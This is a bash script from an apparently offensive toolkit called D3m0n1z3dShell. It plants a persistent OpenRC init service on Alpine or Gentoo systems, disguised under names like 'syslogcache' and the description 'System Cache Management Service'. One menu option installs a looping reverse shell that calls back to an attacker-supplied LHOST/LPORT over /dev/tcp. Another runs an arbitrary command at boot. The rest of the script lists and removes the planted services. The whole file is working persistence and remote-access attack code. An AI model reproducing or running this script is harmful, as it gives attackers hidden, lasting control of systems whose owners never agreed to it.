#!/bin/bash
# D3m0n1z3dShell — OpenRC Service Persistence (T1543)
# Based on Metasploit init_openrc.rb — Alpine/Gentoo init system

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_openrc"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   OpenRC Service Persistence                      ║"
    echo " ║   T1543 — Alpine/Gentoo init service              ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root(){
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
}

check_openrc(){
    if ! command -v rc-update >/dev/null 2>&1; then
        echo -e "${RED}[-] OpenRC not found (rc-update missing)${NC}"
        echo -e "${YELLOW}[*] This technique is for Alpine Linux, Gentoo, or other OpenRC systems${NC}"
        return 1
    fi
    return 0
}

install_service(){
    local SVC_NAME="$1" PAYLOAD="$2"
    local SVC_FILE="/etc/init.d/${SVC_NAME}"
    local PID_FILE="/run/${SVC_NAME}.pid"

    cat > "$SVC_FILE" << EOF
#!/sbin/openrc-run
# ${MARKER}

name="${SVC_NAME}"
description="System Cache Management Service"
command="/bin/sh"
command_args="-c '${PAYLOAD}'"
command_background="yes"
pidfile="${PID_FILE}"

depend() {
    need net
    after firewall
}
EOF

    chmod 755 "$SVC_FILE"
    rc-update add "$SVC_NAME" default 2>/dev/null

    echo -e "${GREEN}[+] OpenRC service installed: ${SVC_FILE}${NC}"
    echo -e "${YELLOW}[*] Added to 'default' runlevel${NC}"

    read -p "Start service now? [y/N]: " START
    if [[ "$START" =~ ^[Yy]$ ]]; then
        rc-service "$SVC_NAME" start 2>/dev/null
        echo -e "${GREEN}[+] Service started${NC}"
    fi
}

menu(){
    banner
    check_root
    check_openrc || return 1

    echo -e "  ${CYAN}[1]${NC} Install service (reverse shell)"
    echo -e "  ${CYAN}[2]${NC} Install service (custom command)"
    echo -e "  ${CYAN}[3]${NC} List d3m0n services"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-4]: " OPT

    case "$OPT" in
        1)
            read -p "  Service name [syslogcache]: " SVC
            SVC="${SVC:-syslogcache}"
            read -p "  LHOST: " LHOST
            read -p "  LPORT: " LPORT
            PAYLOAD="nohup /bin/sh -c 'while true; do sh -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null; sleep 60; done' &"
            install_service "$SVC" "$PAYLOAD"
            ;;
        2)
            read -p "  Service name [syslogcache]: " SVC
            SVC="${SVC:-syslogcache}"
            read -p "  Command: " CMD
            install_service "$SVC" "$CMD"
            ;;
        3)
            echo -e "${CYAN}[*] D3m0n OpenRC services:${NC}"
            grep -rl "$MARKER" /etc/init.d/ 2>/dev/null | while read -r f; do
                local svc=$(basename "$f")
                local status=$(rc-service "$svc" status 2>/dev/null | head -1)
                echo -e "  ${GREEN}→${NC} ${svc}: ${status}"
            done
            ;;
        4)
            echo -e "${YELLOW}[*] Removing d3m0n OpenRC services...${NC}"
            grep -rl "$MARKER" /etc/init.d/ 2>/dev/null | while read -r f; do
                local svc=$(basename "$f")
                rc-service "$svc" stop 2>/dev/null
                rc-update del "$svc" default 2>/dev/null
                rm -f "$f"
                echo -e "  ${GREEN}[+] Removed: ${svc}${NC}"
            done
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
